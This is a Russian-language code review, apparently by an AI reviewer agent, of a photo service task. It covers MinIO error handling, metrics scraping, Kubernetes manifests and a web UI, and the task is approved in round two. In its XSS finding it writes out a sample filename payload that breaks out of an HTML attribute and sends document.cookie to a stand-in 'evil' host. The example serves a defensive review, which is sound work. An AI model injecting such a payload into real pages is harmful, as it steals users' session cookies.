---
task_id: TASK-003
agent: reviewer-1
model: opus
status: APPROVE
review_round: 2
inputs:
  - specs/constitution.md
  - specs/feature-upload/tasks.md (раздел TASK-003, «Лучший кадр батча» — редакция TASK-003)
  - tasks/TASK-003/05_spike_analyzer.md
  - tasks/TASK-003/20_design.md
  - tasks/TASK-003/30_impl.md
  - незакоммиченный дифф рабочего дерева (git diff + untracked)
outputs:
  - tasks/TASK-003/40_review-1.md
blocking_findings: 0
blocking_findings_round_1: 3
non_blocking_findings: 13
timestamp: 2026-07-22T00:00:00Z
---

# TASK-003 · Ревью 1 (корректность и архитектура)

**status: APPROVE** (раунд 2) — все 3 BLOCKING закрыты и перепроверены исполнением,
0 открытых блокеров. Ниже сохранён полный текст раунда 1 (для истории), в конце —
раздел **«Re-review (раунд 2)»** с подтверждением по каждому пункту и одной новой
не-блокирующей находкой.

> Раунд 1 (исторический вердикт): **CHANGES_REQUESTED** — 3 BLOCKING, 12 NON_BLOCKING.

Ядро блока A сделано хорошо и, что важнее, **проверено мной исполнением, а не чтением**:
формула лучшего кадра действительно выбирает резкий кадр на данных спайка, лимит 4 MiB
действительно соблюдается с запасом, защита от «бомб» действительно срабатывает до
декодирования. Блокеры лежат не там, где их ждали: два из трёх — на стыке с инфраструктурой
(классификация недоступности MinIO и сбор метрик при `replicas: 2`), третий — во фронте.

---

## Гейты

| Гейт | Результат |
|---|---|
| `uv run ruff check .` | `All checks passed!` |
| `uv run pytest -q -m "not integration"` | **497 passed**, 1 deselected — совпадает с заявленным |
| `pytest` ходит в сеть до `45.132.19.101`? | Нет. `grep` по `tests/` даёт единственное вхождение — как строка origin в `test_config.py:226`. Тесты используют заглушку/моки |

---

## Проверка по существу

Таблица «решает ли реализация ЗАЯВЛЕННУЮ проблему». Колонка «как проверено» — приоритет
исполнению над чтением.

| Требование | Решает? | Как проверено / обоснование |
|---|---|---|
| **Формула лучшего кадра** (ведро → faces → eyes → blur → created_at → photo_id; `is_blurred` не используется) | **да** | Прогнал `select_best_photo` на 15 сценариях, включая точные значения спайка (0.375 / 1.10 / 2.926 / 930.47 / 99 773.999). Все 15 PASS. Отдельно подтверждено: (1) на смеси «размытый с 5 лицами» vs «резкий с 1 лицом» выбирается **резкий** — старая формула выбрала бы размытый; (2) ведро реально первично — `blur=101, faces=0` бьёт `blur=99, faces=5`; (3) порог включающий — `blur=100.0` попадает в «резкие»; (4) внутри ведра композиция важнее резкости — `faces=3, blur=1000` бьёт `faces=1, blur=99999`; (5) `is_blurred=False` на размытом кадре его **не спасает**, `is_blurred=True` на всех (как у реального анализатора) не ломает сортировку |
| **NULL в `eyes_closed_count` не роняет сортировку** | **да** | Прогон: `eyes=None` бьёт `eyes=1`; `eyes=None` и `eyes=0` дают ничью и решение уходит на следующий ключ (`blur_score`). `TypeError` при сравнении `None` невозможен — `p.analysis.eyes_closed_count or 0` (`batch_service.py:101`) |
| **Функция осталась чистой** | **да** | `Settings` встречается в `batch_service.py` только в докстринге, `get_settings` — нигде; `SHARPNESS_THRESHOLD` — модульная константа (:83). Прогон выполнен на голых объектах-заглушках без БД и без конфигурации приложения |
| **Тесты формулы покрывают тай-брейки, а не переписаны под поведение** | **да** | В `tests/test_batch_service.py` есть отдельные тесты на каждый ключ: `test_sharp_bucket_beats_blurry_bucket_even_with_worse_other_fields`, `test_more_faces_wins_within_the_same_sharpness_bucket`, `test_fewer_closed_eyes_wins_when_bucket_and_faces_tied`, `test_null_eyes_closed_count_is_treated_as_zero`, `test_higher_blur_score_wins_within_same_sharpness_bucket`, `test_earlier_created_at_wins_...`, `test_photo_id_is_final_deterministic_tiebreak_on_complete_tie`, `test_is_blurred_does_not_affect_the_outcome`. Это не переименованные старые, а покрытие нового порядка ключей |
| **Бюджет 4 MiB с запасом на служебные байты** | **да** | Арифметика замкнута: любой выход `prepare_for_analysis` ≤ `ANALYZER_MAX_IMAGE_BYTES = 3 500 000` (либо ранний возврат по условию `len(data) <= 3.5 МБ`, либо ступень лесенки по тому же условию), плюс `_MESSAGE_OVERHEAD_BYTES = 1024` < `4 194 304`. Прогон: JPEG 6.72 МБ / 4000 px → 1 646 КБ @2048×1536; JPEG 8.07 МБ / 2048 px q100 → 2 053 КБ. Оба влезают |
| **Что если после всей лесенки не влезает** | **да** | `image_prep.py:155` — `ImageTooLargeError` → `classify_error` → `(NO_RETRY, IMAGE_TOO_LARGE)`, gRPC-вызов не делается (общий анализатор не тревожим). Плюс второй эшелон: превентивная проверка в `analysis_processor.py:178` |
| **Защита от «бомб»** | **да** | Прогон: PNG 9000×9000 (файл всего 258 КБ, 81 Мпикс) отклонён **до декодирования** — `ImageTooLargeError`, растр 243 МБ не поднимался. 8000×7000 (56 Мпикс) тоже отклонён. Порог читается из заголовка (`Image.open` ленив) |
| **Детерминизм подготовки** | **да** | Прогон: два вызова на одном входе дали байт-в-байт одинаковый результат. Pillow пинован минорно (`>=11.0,<12`) |
| **Не ломает ранние лимиты загрузки (F2)** | **да** | `git diff` по `app/api/uploads.py`, `app/services/photo_service.py` — **пусто**. Лимиты 50 МБ / 150 МБ и капнутые чтения не тронуты |
| **MESSAGE_TOO_LARGE → NO_RETRY** | **да** | Обе ветки (превентивная `AnalyzerMessageTooLarge` и распознавание detail) обслуживаются **одной** функцией `_is_message_too_large` (`analyzer_client.py:57`), которую вызывают и `classify_grpc_error`, и `error_code_from_exception` — разъехаться архитектурно не могут |
| **Обычный `RESOURCE_EXHAUSTED` (троттлинг) всё ещё RETRY** | **да** | `analyzer_client.py:154-159`: маркер не найден → код в `_RETRYABLE_GRPC_CODES` → RETRY. Покрыто тестами `TestClassifyGrpcErrorMessageTooLarge` |
| **Ошибка чтения MinIO классифицирована как временная** | **ЧАСТИЧНО — см. BLOCKING-1** | `S3Error` → `StorageUnavailable` → RETRY ✅. Но реальная **недоступность** MinIO (connection refused/таймаут соединения) даёт `urllib3.exceptions.MaxRetryError`, который `get_file` не перехватывает. Прогон подтвердил: `classify_error → (NO_RETRY, 'UNKNOWN')`. Это ровно тот случай, ради которого писалось требование A2 |
| **Скачивание после захвата и внутри цикла с кешированием** | **да** | `analysis_processor.py:207` (claim) → :244 (цикл) → :247 `if prepared is None` → :253 `_prepare_image`. Повторного скачивания на второй попытке нет; есть тест `test_image_is_downloaded_and_prepared_only_once_across_retries` |
| **Таймаут на чтение и на подготовку** | **да, но с оговоркой** | `asyncio.timeout(60)` / `asyncio.timeout(30)` (:168, :172). Прогнал поведение `asyncio.timeout` вокруг `anyio.to_thread.run_sync`: ожидание действительно прерывается по таймауту (0.50 с на 3-секундном потоке), т.е. заявленная защита работает; поток дорабатывает сам (документировано в дизайне §5.3). Оговорка — в NB-4 (мис-атрибуция кода) |
| **`storage` обязательный параметр** | **да** | `analysis_processor.py:106-107` — keyword-only без дефолта; вызов без него падает `TypeError` |
| **Миграция v003 применяется/откатывается, поля nullable, enum нет** | **не проверено исполнением** | Код миграции корректен: 4 `add_column` nullable без `server_default`, `downgrade` в обратном порядке, `postgresql.JSONB`, никаких `postgresql.ENUM`. Реальный прогон на Postgres в этой среде невозможен (нет Docker) — интеграционный тест штатно `deselected`. **Остаётся открытым гейтом**, как и заявил кодер |
| **Заглушка: 8 полей, семантика blur_score, детерминизм** | **да** | `analyzer-stub/server.py`: лог-шкала `10 ** (digest[1]/255*5)` → 1…100 000, больше = резче; `is_blurred = blur_score < 100`; все 8 полей; `eyes_closed_count ≤ faces_count`; пустые `image_bytes` → `INVALID_ARGUMENT` |
| **Миграции — Job, а не initContainer** | **да** | `k8s/30-migrate-job.yaml` — `Job`, `backoffLimit: 3`, `ttlSecondsAfterFinished: 600`, `restartPolicy: OnFailure`. В `31-api.yaml` команда контейнера **без** `alembic upgrade head`; в compose она остаётся (одна реплика). Порядок между Job и Deployment-ами не полагается на `kubectl apply` — его держит initContainer `wait-for-schema`. Решение верное. Но см. NB-2 (`backoffLimit: 3` мал для холодного старта) |
| **Пробы: liveness не зависит от внешних систем** | **да** | api: liveness `/healthz` (всегда 200, без вызовов зависимостей), readiness `/readyz` (БД + MinIO) — разделение корректное. worker: `/metrics:8001` с честным комментарием-ограничением в манифесте |
| **Секреты в Secret, не в ConfigMap** | **да** | `11-secret.yaml` — `DATABASE_URL`, `POSTGRES_*`, `MINIO_*`, `GF_SECURITY_ADMIN_PASSWORD`. В `10-configmap.yaml` секретов нет, пересечений ключей нет. См. NB-8 про гранулярность |
| **analyzer-stub в k8s не разворачивается** | **да** | Манифеста нет; `ANALYZER_GRPC_ADDR: "45.132.19.101:50051"` в ConfigMap |
| **Образы `:local` + IfNotPresent** | **да (для наших)** | `photo-service:local` в api/worker/migrate-job/initContainer и `photo-web:local` в web — все с `imagePullPolicy: IfNotPresent`. См. NB-7 про сторонние образы без тега |
| **PVC для postgres/minio/kafka** | **да** | `volumeClaimTemplates` 5Gi/10Gi/5Gi. kind поставляет `local-path` как default StorageClass — провижининг сработает |
| **Веб: адрес API не захардкожен** | **да** | Единственный источник — `window.APP_CONFIG.apiBaseUrl` из `config.js`, генерируемого `envsubst` на **старте контейнера**. В JS нет ни одного литерала `localhost:8000` |
| **Поллинг останавливается на терминальных статусах** | **да** | `setTimeout`-цепочка (не `setInterval`) во всех трёх экранах; перепланирование только при нетерминальном статусе; потолок 100 итераций; пауза на `document.hidden`. Мелочь — NB-11 |
| **Ошибки по `{error_code, message, request_id}`** | **да** | Таблица `ERROR_MESSAGES` в `api.js` сверена с `app/core/errors.py` — коды совпадают; неизвестный код → сообщение сервера; голый `TypeError` от `fetch` → «Не удалось связаться с сервисом», а не «Failed to fetch» |
| **Поле батча — `file`, не `files`** | **да** | `api.js: formData.append("file", file)` в цикле; `app/api/batches.py:32` — `file: list[UploadFile] = File(...)`. Совпадает |
| **CORS — явный список, не звёздочка** | **да** | `Settings.CORS_ALLOWED_ORIGINS` + `cors_allowed_origins_list`; `allow_credentials=False`; middleware добавлен после `RequestIdMiddleware` (значит внешний) — рассуждение о порядке Starlette верное |
| **F1 (at-least-once с seek) не откачен** | **да** | `git diff app/worker/consumer.py` — пусто. Логика `seek()` на RETRY-ветке на месте |
| **F2 (ранние лимиты) не откачен** | **да** | `git diff app/api/`, `app/services/photo_service.py` — пусто |
| **F3 (read-only GET батча) не откачен** | **да** | `BatchService.get_batch` (`batch_service.py:114-160`) не пишет в БД; завершение батча по-прежнему в `AnalysisProcessor._maybe_complete_batch` |
| **F4 (раскол метрик) не откачен** | **да** | Все 3 новые метрики только в `metrics_worker.py`; `git diff metrics_api.py` — пусто; `analysis_processor` импортирует `select_best_photo` из `batch_service` |
| **F5 (компенсации MinIO) не откачен** | **да** | `git diff app/services/photo_service.py` — пусто |
| **Публичный формат ошибок / контракты не сломаны** | **да** | Новые поля в `AnalysisResultResponse` — все `| None = None`, совместимое расширение. Новые коды (`MESSAGE_TOO_LARGE`, `OBJECT_NOT_FOUND`, `IMAGE_DECODE_FAILED`, `IMAGE_TOO_LARGE`) остаются внутренними `photos.last_error_code` |

---

## BLOCKING

### BLOCKING-1 — недоступность MinIO классифицируется как NO_RETRY/UNKNOWN: A2 не выполнено

**Файл:** `photo-service/app/integrations/storage.py:89-102` (`get_file`), следствие в
`photo-service/app/services/analysis_errors.py:52-61`.

**Проблема.** Спека A2 требует: «Ошибку чтения из MinIO классифицировать как **retryable**
(временная)». Дизайн §4.2 закрепляет: `StorageUnavailable` (MinIO недоступен) → RETRY /
`STORAGE_UNAVAILABLE`. Реализация конвертирует в `StorageUnavailable` **только `S3Error`**.
Но `S3Error` — это ошибка **протокола S3**, то есть ответ уже поднятого MinIO. Когда MinIO
реально недоступен (под перезапускается, StatefulSet катится, сетевой блип в кластере),
Python-SDK `minio` бросает `urllib3.exceptions.MaxRetryError`, который не является
`S3Error` и проходит `get_file` насквозь.

**Доказано исполнением:**

```
$ uv run python -c "... ObjectStorage(Settings(MINIO_ENDPOINT='127.0.0.1:9')).get_file(...) ..."
RAISED: urllib3.exceptions.MaxRetryError
classify_error -> (<RetryDecision.NO_RETRY: 'no_retry'>, 'UNKNOWN')
```

**Последствия** — ровно те, которые требование должно было предотвратить:
1. фото уходит в `failed` **с первой же попытки**, ретраев нет (при том, что gRPC получает три);
2. `last_error_code = UNKNOWN` — «невнятный код», против которого писалось A4;
3. метрика идёт в `analyzer_grpc_errors_total{code="UNKNOWN"}`, а не в
   `storage_read_errors_total` (`analysis_processor.py:263`) — то есть новая метрика
   в самом важном сценарии **не инкрементируется никогда**, а на дашборде авария MinIO
   выглядит как авария анализатора;
4. кратковременный рестарт пода `minio` в кластере превращает всю пачку in-flight фото
   в перманентно `failed` — это видно во время демонстрации D3.

**Исправление (исполнимо как есть).** В `app/integrations/storage.py`:

```python
import urllib3.exceptions
...
    def get_file(self, object_name: str) -> bytes:
        try:
            response = self._client.get_object(self._bucket, object_name)
            try:
                return response.read()
            finally:
                response.close()
                response.release_conn()
        except S3Error as exc:
            if exc.code == "NoSuchKey":
                raise NotFoundError("Object not found") from exc
            logger.error("failed to read object from MinIO: %s", exc)
            raise StorageUnavailable("MinIO is unreachable") from exc
        except (urllib3.exceptions.HTTPError, OSError) as exc:
            # MinIO вообще не отвечает (connection refused / DNS / read timeout):
            # SDK бросает MaxRetryError/ProtocolError, а не S3Error.
            logger.error("MinIO unreachable while reading object: %s", exc)
            raise StorageUnavailable("MinIO is unreachable") from exc
```

То же — в `save_file` и `ensure_bucket`: без этого constitution §3.2 («если MinIO
недоступен → 503, а не 500») нарушается и на пути загрузки — сейчас `MaxRetryError`
дойдёт до generic-хендлера и превратится в 500/`INTERNAL_ERROR`.

Дополнительно (дёшево и страхует от следующей библиотеки) — добавить ветку в
`app/services/analysis_errors.py` перед делегированием:

```python
    if isinstance(exc, (urllib3.exceptions.HTTPError, ConnectionError)):
        return RetryDecision.RETRY, "STORAGE_UNAVAILABLE"
```

Тест, который нужно добавить: `classify_error(urllib3.exceptions.MaxRetryError(None, "u"))
== (RetryDecision.RETRY, "STORAGE_UNAVAILABLE")`.

---

### BLOCKING-2 — Prometheus скрейпит 2-репличные Deployment-ы через ClusterIP: метрики и все 4 алерта недостоверны

**Файлы:** `photo-service/k8s/40-prometheus.yaml` (`scrape_configs`),
`photo-service/k8s/31-api.yaml:29` (`replicas: 2`), `photo-service/k8s/32-worker.yaml:37`
(`replicas: 2`).

**Проблема.** Скрейп-конфиг статический:

```yaml
      - job_name: photo-api
        static_configs:
          - targets: ["api:8000"]
      - job_name: photo-worker
        static_configs:
          - targets: ["worker:8001"]
```

`api` и `worker` — обычные ClusterIP-сервисы поверх **двух** подов. kube-proxy
балансирует **каждое новое TCP-соединение**, то есть каждый скрейп (раз в 10 с) попадает
в случайную реплику, но пишется в **одну и ту же временную серию** (`instance="api:8000"`).
У реплик независимые счётчики `prometheus_client` (не multiprocess-режим), поэтому серия
осциллирует между двумя разными монотонными значениями. Prometheus интерпретирует каждое
падение как counter reset.

**Последствия:**
- `rate(...)`/`increase(...)` завышаются и скачут — все панели дашборда (в том числе две
  новые, `analyzer_image_prepared_bytes` p50/p95 и доля уменьшенных) показывают мусор.
  Это напрямую ломает критерий приёмки D3 п.4 «открыть Grafana и показать графики»;
- алерт `WorkerStalled` (`increase(worker_messages_processed_total[10m]) == 0 and
  photos_pending > 0`) становится бессмысленным — при живом воркере `increase` почти
  никогда не даст 0, а `photos_pending` берётся у случайной api-реплики;
- `AnalyzerUnavailable` (`increase(...) > 10`) сработает раньше времени на артефактах ресетов;
- ошибка «тихая»: `up == 1` всегда, ничто не сигнализирует, что данные испорчены.

Дизайн §9.9 добросовестно разобрал безопасность `replicas: 2` **по данным** (атомарный
захват, идемпотентный upsert), но не разобрал её **по наблюдаемости** — а наблюдаемость
здесь часть приёмки.

**Исправление — выбрать один вариант.**

*Вариант A (правильный, ~25 строк).* Перейти на service discovery по подам. В
`k8s/40-prometheus.yaml`:

```yaml
    scrape_configs:
      - job_name: photo-api
        kubernetes_sd_configs:
          - role: pod
            namespaces: { names: [photo-service] }
        relabel_configs:
          - source_labels: [__meta_kubernetes_pod_label_app]
            action: keep
            regex: api
          - source_labels: [__address__]
            action: replace
            regex: (.+?)(?::\d+)?
            replacement: $1:8000
            target_label: __address__
          - source_labels: [__meta_kubernetes_pod_name]
            target_label: instance
      - job_name: photo-worker
        # то же самое с regex: worker и портом 8001
```

плюс в тот же файл — `ServiceAccount: prometheus`, `ClusterRole` с
`get/list/watch` на `pods`/`endpoints`/`services` и `ClusterRoleBinding`, и
`serviceAccountName: prometheus` в Deployment. Тогда каждая реплика становится отдельной
серией с уникальным `instance`, а панели надо обернуть в `sum(rate(...))`.

*Вариант B (минимальный, если хочется уложиться в демо).* Поставить `replicas: 1` для
`api` и `worker` в k8s, а масштабируемость показывать вручную
(`kubectl -n photo-service scale deploy/worker --replicas=2`) с явной оговоркой в README,
что при этом метрики становятся недостоверными до перехода на SD. В этом случае **надо
также** снять `KAFKA_NUM_PARTITIONS: "3"` из обоснования или оставить как есть с
комментарием.

Вариант A предпочтителен: `replicas: 2` для worker — заявленная демонстрация C3, и терять
её не хочется.

---

### BLOCKING-3 — XSS в веб-интерфейсе: `escapeHtml` не экранирует кавычки, а результат подставляется в HTML-атрибуты

**Файлы:** `photo-service/web/html/js/format.js:20-24` (`escapeHtml`);
места подстановки — `gallery.js:28`, `gallery.js:31`, `batch.js:26`, `batch.js:29`,
`photo.js:39`, `photo.js:73`.

**Проблема.**

```js
function escapeHtml(value) {
  const div = document.createElement("div");
  div.textContent = value == null ? "" : String(value);
  return div.innerHTML;
}
```

Сериализация текстового узла в `innerHTML` по спецификации HTML экранирует только
`&`, `<`, `>` и U+00A0 — **двойная кавычка не экранируется** (кавычки экранируются лишь
при сериализации значений атрибутов, а здесь узел текстовый). Результат подставляется
внутрь двойных кавычек атрибутов:

```js
<img src="${imgUrl}" alt="${window.format.escapeHtml(photo.filename)}" loading="lazy" />
<span class="filename" title="${window.format.escapeHtml(photo.filename)}">
<span class="color-swatch" style="background:${window.format.escapeHtml(analysis.dominant_color || "#cccccc")}">
```

`filename` приходит от клиента и сохраняется **без санитизации**
(`app/services/photo_service.py:185` — `filename=filename or f"{photo_id}.{ext}"`),
`dominant_color`/`tags` приходят от внешнего анализатора, которому мы не доверяем по
определению (constitution §2.1). Имя файла вида

```
a" onerror="fetch('http://evil/'+document.cookie)
```

выходит из атрибута `alt` и даёт **хранимый XSS** на галерее и на странице батча —
срабатывает у любого, кто откроет UI. Это новый код этой таски, а не унаследованный.

**Исправление (одно место, исполнимо как есть).** `web/html/js/format.js`:

```js
function escapeHtml(value) {
  return String(value == null ? "" : value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
```

Дополнительно стоит не подставлять `dominant_color` в `style=` сырым, а валидировать его
регуляркой `/^#[0-9a-fA-F]{3,8}$/` перед использованием, иначе кривой ответ анализатора
испортит вёрстку (`photo.js:39`).

---

## NON_BLOCKING

**NB-1 (MAJOR). Две реплики api = два конкурирующих outbox-публикатора без блокировки строк.**
`photo-service/app/repositories/photo_repository.py:162-170` — `fetch_unpublished` это
обычный `SELECT ... WHERE publish_status='not_sent' ORDER BY created_at LIMIT n` без
`FOR UPDATE SKIP LOCKED`. `run_outbox_publisher` стартует в lifespan **каждой** api-реплики
(`app/main.py:78`), а `k8s/31-api.yaml` ставит `replicas: 2`. Обе реплики в одном окне
опроса выберут одни и те же строки и **опубликуют одно и то же сообщение дважды**.
Данные не портятся (атомарный захват в воркере отправит дубль в skip-ветку, анализатор
дважды не дёргается), но: трафик Kafka ×2, и `worker_messages_processed_total{result="skipped"}`
станет ≈50% — во время демонстрации это выглядит как баг. Дизайн §9.9 обосновал
`replicas: 2` для worker, но фоновую задачу в api не разбирал вовсе.
*Фикс:* `.with_for_update(skip_locked=True)` в `fetch_unpublished` (и перенос
`mark_published` в ту же транзакцию), либо `replicas: 1` для api с комментарием.

**NB-2 (MAJOR). `backoffLimit: 3` у Job миграций почти наверняка исчерпается на холодном
кластере.** `photo-service/k8s/30-migrate-job.yaml:19`. Дизайн §10.1 прямо разрешает
свернуть шаги 4–7 в один `kubectl apply -f k8s/` — и тогда Job стартует одновременно с
Postgres. `alembic upgrade head` падает, пока БД не поднялась; kubelet при
`restartPolicy: OnFailure` перезапускает контейнер с backoff 10/20/40 с, то есть 4 попытки
укладываются примерно в 70 с. Первый старт `postgres:16` в kind (pull образа + initdb)
регулярно занимает больше. При исчерпании Job переходит в `Failed` **навсегда**, а api и
worker висят в initContainer `wait-for-schema` до 120 с, потом CrashLoopBackOff; выход —
только руками `kubectl delete job/alembic-upgrade` и повторный apply.
*Фикс:* `backoffLimit: 10` и/или initContainer в самом Job, ждущий TCP 5432 (можно
переиспользовать тот же образ: `python -c "import socket,time;..."`), и/или убрать из
дизайна/README разрешение на «одну команду apply».

**NB-3 (MAJOR). Дашборд Grafana ссылается на uid датасорса, который провижининг не задаёт.**
`photo-service/grafana/provisioning/datasources/*.yml` и ConfigMap `grafana-provisioning`
в `k8s/41-grafana.yaml` описывают датасорс **без** `uid`, а все 6 панелей в
`grafana/dashboards/photo-service.json` (и в ConfigMap `grafana-dashboards`) используют
`"datasource": {"type": "prometheus", "uid": "Prometheus"}`. Grafana при провижининге без
`uid` генерирует случайный — панели покажут «Datasource not found». Дефект унаследован от
TASK-002, но именно сейчас он становится критичным: D3 п.4 требует показать графики.
*Фикс:* добавить `uid: Prometheus` в оба файла провижининга датасорса (одна строка в
каждом).

**NB-4 (MINOR). Таймаут чтения MinIO мис-атрибутируется как ошибка анализатора.**
`app/services/analysis_processor.py:168-175`: `asyncio.timeout(STORAGE_READ_TIMEOUT_SECONDS)`
бросает `TimeoutError`, который `error_code_from_exception` превращает в `"TIMEOUT"` —
код не входит в `_STORAGE_ERROR_CODES`, поэтому событие уходит в
`analyzer_grpc_errors_total{code="TIMEOUT"}` и неотличимо от таймаута gRPC.
*Фикс:* обернуть каждый из двух блоков в `try/except TimeoutError` и перевыбросить
`StorageUnavailable("MinIO read timed out")` / отдельное `ImagePrepTimeout`.

**NB-5 (MINOR). Cooldown не покрывает самую вероятную форму отказа анализатора.**
`analysis_processor.py:86` — `_COOLDOWN_ERROR_CODES = {"UNAVAILABLE", "DEADLINE_EXCEEDED"}`,
но вызов обёрнут в `asyncio.timeout(self._grpc_timeout)` (:255) с **тем же** значением,
что передаётся в стаб как `timeout=`. Кто победит в гонке — не детерминировано; если
победит `asyncio.timeout`, код будет `"TIMEOUT"` и дроссель A7 не сработает.
*Фикс:* сделать внешний таймаут строго больше (`self._grpc_timeout + 5`), чтобы gRPC
всегда успевал отдать `DEADLINE_EXCEEDED`, либо добавить `"TIMEOUT"` в множество.

**NB-6 (MINOR). Легальные крупные фото навсегда `failed`.** `ANALYZER_MAX_IMAGE_PIXELS =
50_000_000` (`config.py`) при `MAX_FILE_SIZE_BYTES = 50 МБ` — снимок 108 Мпикс успешно
загрузится (F2 пропустит), но анализ всегда даст `IMAGE_TOO_LARGE` без ретрая; в UI
пользователь увидит только «Анализ не удался». Прогон подтвердил: 8000×7000 отклонён.
Это осознанный компромисс (дизайн §5.4/R6), но он нигде не документирован для
пользователя и не смягчён. *Фикс:* либо документировать ограничение в README/DEPLOYMENT,
либо для входов >50 Мпикс всё-таки идти по ветке лесенки с `draft()` (память защищена
именно `draft()`, а не отказом).

**NB-7 (MINOR). Сторонние образы без тега → `:latest` + `imagePullPolicy: Always`.**
`k8s/21-minio.yaml` (`minio/minio`), `k8s/40-prometheus.yaml` (`prom/prometheus`),
`k8s/41-grafana.yaml` (`grafana/grafana`). Демо перестаёт быть воспроизводимым (MinIO
регулярно ломает совместимость консоли между релизами), и это противоречит и
constitution §9, и собственной аргументации дизайна §9.1/§9.3 про пин
`kindest/node:v1.31.2`. `postgres:16` и `apache/kafka:3.7.0` при этом запинованы —
непоследовательно. *Фикс:* проставить конкретные теги.

**NB-8 (MINOR). `envFrom: secretRef` раздаёт все секреты всем.** `k8s/20-postgres.yaml`
и `k8s/21-minio.yaml` подключают весь `photo-secrets` целиком, поэтому в окружении пода
Postgres лежат `MINIO_SECRET_KEY` и `GF_SECURITY_ADMIN_PASSWORD`, и наоборот. Для
эфемерного локального кластера некритично, но принцип наименьших привилегий нарушен и
это единственный пункт, который стоило сделать «как в проде».
*Фикс:* `env: valueFrom: secretKeyRef` по нужным ключам.

**NB-9 (MINOR). `readyz` блокирует event loop синхронным вызовом MinIO SDK каждые 5 с.**
`app/main.py:186` — `app.state.storage.ensure_bucket()` вызывается прямо в async-хендлере,
а `k8s/31-api.yaml` ставит readiness `periodSeconds: 5` без `timeoutSeconds`. При зависшем
MinIO цикл событий встанет на всё время connect-таймаута, и проба (дефолтный
`timeoutSeconds: 1`) начнёт валиться, роняя обе реплики в NotReady. Дефект унаследован,
но частота проб его усиливает. *Фикс:* `await anyio.to_thread.run_sync(...)` и явный
`timeoutSeconds: 3` в манифесте.

**NB-10 (MINOR). Ошибка `DecompressionBombError` от самого Pillow даёт неверный код.**
Вход выше `2 × Image.MAX_IMAGE_PIXELS` (≈179 Мпикс) заставит `Image.open` в
`image_prep.py:66` бросить `DecompressionBombError`, который перехватится широким
`except` и превратится в `ImageDecodeError` → `IMAGE_DECODE_FAILED` вместо
`IMAGE_TOO_LARGE`. Косметика, но метрика/алерт рассказывают не ту историю.
*Фикс:* отдельная ветка `except Image.DecompressionBombError` → `ImageTooLargeError`.

**NB-11 (MINOR). Лишний опрос при возврате на вкладку.** `gallery.js:129`, `photo.js:100`,
`batch.js:79` — обработчик `visibilitychange` зовёт `schedulePoll()` безусловно, поэтому
возврат на вкладку с полностью терминальными фото порождает один лишний запрос (дальше
цепочка корректно останавливается). Заявление в `30_impl.md` о «останавливается на
терминальных статусах» чуть сильнее кода. *Фикс:* проверять условие перед вызовом.

**NB-12 (NOTE). Устаревшие ссылки на исключённый из скоупа серверный деплой.**
`analyzer-stub/server.py` (докстринг) упоминает `docker-compose.server.yml`;
`web/Dockerfile` и `web/html/config.js.template` — `http://45.132.19.101:51101`.
Решением C5/D5 серверный деплой из скоупа исключён, файла `docker-compose.server.yml`
не существует. Читателя это дезориентирует. Заодно: корневой `.gitignore` не покрывает
Office-локи (`~$*.pptx` сейчас в untracked).

---

## Что сделано хорошо (без реверансов, по делу)

- Разделение классификации на `analysis_errors.py` (storage/image) и `analyzer_client.py`
  (gRPC/таймауты) — правильная граница слоёв, и решение «обе точки принятия решения
  используют одну `_is_message_too_large`» закрывает целый класс будущих расхождений.
- Кеш `prepared` внутри цикла попыток (`if prepared is None`) — это именно тот вариант,
  который делает временную ошибку MinIO симметричной временной ошибке gRPC, не платя
  повторным ресайзом. Разбор трёх альтернатив в дизайне §5.2 честный.
- `storage` как обязательный keyword-only без дефолта — сознательный выбор «сломать
  громко», а не «деградировать тихо». Одобряю.
- Обоснование, почему первым ключом идёт **ведро**, а не сырой `blur_score` (иначе
  остальные ключи становятся мёртвым кодом) — самое ценное архитектурное решение таски,
  и оно подтверждается прогоном.
- `ON CONFLICT DO NOTHING` осознанно НЕ заменён на `DO UPDATE` ради дозаполнения новых
  полей — соблазн был реальный, отказ правильный.

---

## Что нужно для APPROVE

1. Исправить BLOCKING-1 (классификация недоступности MinIO) + тест на `MaxRetryError`.
2. Исправить BLOCKING-2 (сбор метрик при `replicas: 2`) — вариант A или B.
3. Исправить BLOCKING-3 (`escapeHtml` не экранирует кавычки).
4. Желательно в этом же заходе: NB-1, NB-2, NB-3 — все три бьют по живому прогону D3.
5. Открытым гейтом остаётся реальный прогон `test_migration_integration.py` на Postgres
   и `kubectl apply` на живом kind — это не ко мне, но без них критерии приёмки
   «миграция применяется/откатывается на реальном Postgres» и «манифесты валидны
   (`--dry-run=server` или прогон на кластере)» формально не закрыты.

---

# Re-review (раунд 2)

Проверено по рабочему дереву после итерации правок №1. Прогонял сам — на слово
самопроверку оркестратора не принимал.

## Гейты (перепрогнаны мной)

| Гейт | Результат |
|---|---|
| `uv run ruff check .` | `All checks passed!` |
| `uv run pytest -q -m "not integration"` | **503 passed**, 1 deselected (было 497 → +6 регрессионных) |

## Закрытие блокеров

### BLOCKING-1 — ЗАКРЫТ (проверено исполнением)

`app/integrations/storage.py`: добавлен модульный кортеж
`_TRANSPORT_ERRORS = (urllib3.exceptions.HTTPError, ConnectionError)` с развёрнутым
комментарием, объясняющим, почему `S3Error` недостаточно. Ветка `except _TRANSPORT_ERRORS`
добавлена **во все три** метода, а не только в `get_file` — то есть закрыт и мой побочный
пункт про constitution §3.2 («MinIO недоступен → 503, а не 500») на пути загрузки.
`NoSuchKey` по-прежнему остаётся постоянной ошибкой (`NotFoundError` → `OBJECT_NOT_FOUND`),
как и требовалось.

Прогон против закрытого порта `127.0.0.1:9` (тот же сценарий, которым я ловил дефект):

```
get_file      -> StorageUnavailable | classify=(RetryDecision.RETRY, 'STORAGE_UNAVAILABLE')
save_file     -> StorageUnavailable | classify=(RetryDecision.RETRY, 'STORAGE_UNAVAILABLE')
ensure_bucket -> StorageUnavailable | classify=(RetryDecision.RETRY, 'STORAGE_UNAVAILABLE')
```

Было: `MaxRetryError` → `(NO_RETRY, 'UNKNOWN')`. Стало: `(RETRY, 'STORAGE_UNAVAILABLE')`.
Требование A2 теперь выполняется в том самом случае, ради которого писалось, и метрика
`storage_read_errors_total{code="STORAGE_UNAVAILABLE"}` наконец начинает инкрементироваться
(маршрутизация в `analysis_processor.py` идёт по `_STORAGE_ERROR_CODES`, куда этот код входит).

Регрессия закреплена тестами, а не только кодом: `tests/test_storage.py:40` (фабрика
`_transport_error()` на `urllib3.exceptions.MaxRetryError`) и `tests/test_analysis_errors.py:44-59`.
